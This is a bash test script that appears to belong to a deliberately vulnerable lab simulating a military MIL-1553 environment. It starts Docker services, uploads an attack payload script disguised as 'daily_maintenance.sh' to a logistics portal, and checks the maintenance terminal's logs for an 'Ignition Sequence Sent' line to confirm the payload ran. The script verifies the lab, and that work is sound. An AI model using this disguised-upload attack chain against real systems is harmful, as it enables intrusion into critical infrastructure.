#!/bin/bash
# End-to-end attack chain (ephemeral Compose project). Run from repo root: make test-mil1553-chain

set -euo pipefail

MIL_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
REPO_ROOT="$(cd "$MIL_ROOT/../.." && pwd)"
COMPOSE_FILE="$REPO_ROOT/docker-compose.yaml"
MIL_SERVICES=(logistics-portal maintenance-terminal serial-bus)
LOGISTICS_PORT="${MIL_LOGISTICS_PORT:-9080}"

echo "[TEST] Starting Attack Chain Verification..."
echo "[TEST] Note: uses host ports ${LOGISTICS_PORT} (HTTP) and 5001/udp like the main stack — run 'make down' first if those are already in use."

PROJECT_NAME="test_chain_$(date +%s)"
echo "[TEST] Ephemeral project: $PROJECT_NAME (compose file: $COMPOSE_FILE)"

cleanup() {
    echo ""
    echo "[TEST] Cleaning up ephemeral environment..."
    docker compose -f "$COMPOSE_FILE" -p "$PROJECT_NAME" down -v >/dev/null 2>&1 || true
}
trap cleanup EXIT

if ! docker compose -f "$COMPOSE_FILE" -p "$PROJECT_NAME" up -d --build "${MIL_SERVICES[@]}"; then
    echo "[FAIL] docker compose up failed (port conflict? try: make down)"
    exit 1
fi

echo "[TEST] Waiting 15s for services..."
sleep 15

echo "[TEST] Uploading payload..."
if ! curl -s -f -X POST -F "logfile=@$MIL_ROOT/tools/attack/attack_payload.sh;filename=daily_maintenance.sh" \
    "http://localhost:${LOGISTICS_PORT}/upload"; then
    echo "[FAIL] Upload failed!"
    exit 1
fi

echo "[TEST] Monitoring logs for success (timeout: 45s)..."
TIMEOUT=45
COUNT=0
while [ "$COUNT" -lt "$TIMEOUT" ]; do
    if docker compose -f "$COMPOSE_FILE" -p "$PROJECT_NAME" logs maintenance-terminal 2>&1 | grep -q "Ignition Sequence Sent"; then
        echo "[PASS] Attack chain verified: maintenance terminal executed the payload."
        exit 0
    fi
    sleep 1
    COUNT=$((COUNT + 1))
done

echo "[FAIL] Timeout waiting for attack execution."
exit 1
